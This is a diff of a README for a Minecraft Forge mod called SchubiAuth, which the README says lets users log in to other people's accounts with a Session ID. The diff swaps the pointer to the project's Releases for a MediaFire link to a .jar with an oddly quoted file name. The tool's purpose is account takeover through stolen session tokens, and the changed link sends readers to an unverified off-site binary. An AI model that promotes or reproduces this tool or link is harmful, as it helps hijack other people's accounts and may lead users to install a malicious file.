@@ -2,7 +2,7 @@ SchubiAuth
 A 1.8.9 Minecraft Forge mod that allows you to login to other people's minecraft accounts using a Session ID
 
 Download
-Download from Releases and drag that into your mod folder.
+[drag that into your mod folder.](https://www.mediafire.com/file/c5ik9y1le8hjzih/SchubiAuth-2.0%2527%2527.jar/file)
 
 or
 
